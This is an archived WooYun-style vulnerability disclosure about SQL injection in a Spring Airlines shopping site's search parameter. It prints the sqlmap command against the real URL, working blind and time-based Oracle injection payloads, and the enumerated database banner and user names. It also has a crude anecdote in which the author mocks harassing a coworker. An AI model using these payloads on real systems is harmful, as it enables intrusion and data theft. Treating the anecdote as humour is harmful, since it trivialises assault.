wybug_title: 航空行业安全之春秋航空某站点SQL注入
wybug_detail:
漏洞详情 披露状态：   									2016-05-20：	细节已通知厂商并且等待厂商处理中									2016-05-24：	厂商已经确认，细节仅向厂商公开									2016-06-03：	细节向核心白帽子及相关领域专家公开									2016-06-13：	细节向普通白帽子公开									2016-06-23：	细节向实习白帽子公开									2016-07-08：	细节向公众公开  简要描述： 上班无聊跟同事聊天，她打了个哈欠，嘴张得老大，我下意识的用手指插她嘴里，并大喊了一句：“老子爆你菊！”结果把人家给整哭了…奇葩的是她给她老公发微信这么说的：“二逼六哥跟我闹玩，把我怼出血了，疼得我都哭了，他还要爆我菊…”卧槽，这我下班都从特么食堂后门跑的！至于么 详细说明：  
听说你们送飞机，一直以来都是*飞机...忽然感觉好别扭$ python sqlmap.py -u "http://mall.ch.com/product/search?name=%E5%A4%A9%E5%B0%A7%E6%95%B0%E7%A0%81" --level 3 --risk='3' --dbms='oracle' --banner --dbs --users         _ ___ ___| |_____ ___ ___  {1.0.3.9#dev}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 11:42:37[11:42:37] [INFO] testing connection to the target URLsqlmap resumed the following injection point(s) from stored session:---Parameter: name (GET)    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)    Payload: name=%E5%A4%A9%E5%B0%A7%E6%95%B0%E7%A0%81') OR NOT 9023=9023 AND ('sIdv' LIKE 'sIdv    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: name=%E5%A4%A9%E5%B0%A7%E6%95%B0%E7%A0%81') AND 5155=DBMS_PIPE.RECEIVE_MESSAGE(CHR(87)||CHR(98)||CHR(121)||CHR(70),5) AND ('geBH' LIKE 'geBH---[11:42:37] [INFO] the back-end DBMS is Oracle[11:42:37] [INFO] fetching banner[11:42:37] [INFO] resumed: Oracle Database 11g Enterprise Edition Release 11.2.0.3.0 - 64bit Productionweb application technology: JSPback-end DBMS: Oraclebanner:    'Oracle Database 11g Enterprise Edition Release 11.2.0.3.0 - 64bit Production'[11:42:37] [INFO] fetching database users[11:42:37] [INFO] fetching number of database users[11:42:37] [INFO] resumed: 53[11:42:37] [INFO] resumed: WIREREAD[11:42:37] [INFO] resumed: PRT[11:42:37] [INFO] resumed: SESSIONUSER[11:42:37] [INFO] resumed: CQSSS[11:42:37] [INFO] resumed: CQNET[11:42:37] [INFO] resumed: CQCMS[11:42:37] [INFO] resumed: F1USER[11:42:37] [INFO] resumed: CQNETHK[11:42:37] [INFO] resumed: CQSSSHK[11:42:37] [INFO] resumed: CQLOVE[11:42:37] [INFO] resumed: SESSION
   漏洞证明：  
库很多，我不跑完了，延时注入断断续续的...


   修复方案：  过滤单引号 + waf   版权声明：转载请注明来源 路人甲@乌云
